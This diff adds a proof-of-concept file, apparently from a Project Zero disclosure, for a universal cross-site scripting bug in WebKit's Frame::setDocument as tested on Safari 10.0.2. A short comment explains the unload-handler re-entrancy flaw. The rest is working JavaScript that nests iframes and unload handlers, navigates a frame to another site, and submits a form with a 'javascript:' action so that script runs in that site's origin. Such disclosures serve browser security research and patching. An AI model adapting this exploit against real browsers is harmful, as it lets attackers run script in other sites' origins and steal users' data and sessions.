@@ -1,0 +1,55 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1057
+
+Here's a snippet of Frame::setDocument.
+
+void Frame::setDocument(RefPtr<Document>&& newDocument)
+{
+    ASSERT(!newDocument || newDocument->frame() == this);
+
+    if (m_doc && m_doc->pageCacheState() != Document::InPageCache)
+        m_doc->prepareForDestruction();
+
+    m_doc = newDocument.copyRef();
+    ...
+}
+
+Before setting |m_doc| to |newDocument|, it calls |prepareForDestruction| that fires unload event handlers. If we call |Frame::setDocument| with the new document |a|, and call |Frame::setDocument| again with the new document |b| in the unload event handler. Then |prepareForDestruction| will be never called on |b|, which means the frame will be never detached from |b|.
+
+PoC:
+-->
+
+"use strict";
+
+let f = document.documentElement.appendChild(document.createElement("iframe"));
+let a = f.contentDocument.documentElement.appendChild(document.createElement("iframe"));
+
+a.contentWindow.onunload = () => {
+    f.src = "javascript:''";
+
+    let b = f.contentDocument.appendChild(document.createElement("iframe"));
+    b.contentWindow.onunload = () => {
+        f.src = "javascript:''";
+
+        let doc = f.contentDocument;
+
+        f.onload = () => {
+            f.onload = () => {
+                f.onload = null;
+
+                let s = doc.createElement("form");
+                s.action = "javascript:alert(location)";
+                s.submit();
+            };
+
+            f.src = "https://abc.xyz/";
+        };
+
+    };
+};
+
+f.src = "javascript:''";
+
+<!--
+Tested on Safari 10.0.2(12602.3.12.0.1).
+-->
